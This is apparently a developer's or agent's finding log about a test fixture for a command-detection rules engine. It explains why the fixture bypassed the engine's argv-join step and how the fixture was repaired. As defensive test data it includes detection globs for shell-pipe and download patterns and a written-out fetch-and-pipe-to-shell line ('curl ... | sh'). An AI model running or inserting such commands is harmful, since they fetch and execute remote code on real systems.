# FINDING 2026-10-29b — my fixtures hand the engine its own answer

**Class:** test-design defect (the instrument bypasses the code path it is testing)
**Status:** OPEN — one check added; the underlying shape is only partly repaired
**Instrument:** `scripts/argvfixture.py`
**Found:** beat 650, 2026-10-29

## What was wrong

`argvfixture.py` (written last beat) judges every one of its 100 rows like this:

```python
got = match_one(glob, cmd)      # cmd is one already-joined command string
```

But the engine does not match a command string. It matches **argv**, and the
step that turns argv into something matchable lives in `anyArgvMatches`
(`internal/rules/engine.go:211`):

```go
candidates := append([]string{}, argv...)
if exe != "" { candidates = append(candidates, exe) }
if len(argv) > 1 {
    candidates = append(candidates, strings.Join(argv, " "))   // <-- THE JOIN
}
```

That join is **load-bearing** and the engine's own comment says why: auditd
hands back argv split per element, so `["pip","install","evil"]` would never
match the phrase glob `*pip install*` per-element. Without the join, every phrase
glob in the pack is silently dead — the exact failure mode `rule.go` says is
worse than a startup error.

My fixture built the joined string **by hand** and passed it in. Measured:

```
phrase glob  *pip install*   argv ['pip','install','evil']
  per-element would match:   False
  joined string matches:     True
```

So the join is the only thing keeping that rule alive — and my instrument was
supplying the join's output rather than exercising the join.

## Why this is the same defect I keep finding

This is *"an expectation derived from the implementation tests the implementation
against itself"* wearing a different coat. Earlier beats caught it as:

- a fixture bent to match wrong engine behaviour (beat 634),
- a detector that only recognised the spelling it was written against (beat 645),
- a test run under the wrong interpreter (beat 647),
- a faster test that passed against the reverted bug (beat 648).

Here the instrument never even reaches the constructor of the value it certifies.
**A fixture that supplies the engine's own intermediate result cannot certify the
step that produces it.**

## Proof

Added one check to `argvfixture.py`:

```python
ok(join_broken,
   "at least one phrase glob is matched ONLY by the joined line, so a regressed "
   "join would be visible here rather than silent")
```

where `join_broken` collects `(glob, cmd)` pairs that match when joined but would
**not** match per-element. It found **17 phrase globs**, with witnesses including
`*| sh*`, `* -O /home/*`, `*pip install*`.

Mutation-proven by simulating a regressed engine (join replaced with `per_el`):

| tree | failures |
|---|---|
| join removed (mutant) | **1** — `at least one phrase glob is matched ONLY by the joined line … witnesses: []`, rc=1 |
| unmutated control | **0**, rc=0 |

**And the measurement that matters most:** on the mutant tree, **zero of the 100
existing rows detected it.** The blind spot was real and is now measured, not
asserted.

## What is NOT fixed

One check proves *a* phrase glob depends on the join. It does not yet make the
fixtures exercise `anyArgvMatches` itself — the rows still call `match_one`
directly. A full repair means transcribing `anyArgvMatches` into `packcheck.py`
and driving rows with **argv lists**, so element-vs-join routing is under test for
every row rather than spot-checked by one aggregate assertion.

I am naming that rather than calling this fixed. Naming the gap is what this beat
is actually worth; a green 101 checks that silently narrowed the claim would be
worse than the 100 that told the truth about their own reach.

## Wired in

Gate: **65 suites / 1444 checks / 0 failures**. Baseline and `suitecheck_test.sh`'s
M8 pinned control updated to 65/1444 together, so the cheap stub cases cannot
drift from the real tree without something going red.

---

## Update (beat 651) — the fixtures now speak in argv

Last beat ended by naming what was *not* fixed: one aggregate check proved a phrase
glob depends on the join, but the hundred rows still called `match_one()` on a
string I had joined myself. **A gap named is not a gap closed.**

The repair was smaller than I expected, because `packcheck.py` already contained
`any_argv()`, a faithful transcription of the engine's routing:

```python
cands = list(argv)
if exe: cands.append(exe)
if len(argv) > 1: cands.append(" ".join(argv))   # the joined line
return any(any_glob(globs, c) for c in cands)
```

The rows now split their command with `shlex.split` and go through `any_argv()`
instead of `match_one()`. That is the engine's real path — every argv element, the
executable, and the joined line — rather than the single string my own code
produced.

### The number that proves it

Simulated a lost join again (the `if len(argv) > 1` branch disabled) and re-ran:

| | rows broken by a lost join |
|---|---|
| **before this beat** | **0 of 100** |
| **after this beat** | **16 of 100** |

The fixtures went from blind to the join to actually testing it. The aggregate
guard from last beat is still there, but it is no longer the only thing standing
between the pack and silently-dead phrase globs.

### One accounting mistake, recorded

The mutant run prints **17** `FAIL` lines while the footer reports **16** flips. I
chased the discrepancy instead of adjusting a number to match: 17 is 16 *row*
failures **plus** the aggregate sentence "every argv fixture row is judged as
declared". Sixteen rows flipped; the seventeenth line was a summary. Both
measurements agree. **I had briefly counted a summary sentence as a finding** —
the same species of error as counting a comment as coverage, and worth writing
down rather than quietly fixing.

### What is still not done

`shlex.split` is not the engine's parser. The engine receives argv directly from
auditd; my rows reconstruct it from a readable command string. A row whose
meaning depends on quoting (`curl -s "https://x.tld/i" | sh`) would be split
differently by shell and by auditd. No current row depends on that, and the
limits paragraph in `argvfixture.py` says so, but it is an assumption of the
harness rather than a measurement of the engine.

Gate after the change: **65 suites / 1444 checks / 0 failures**.
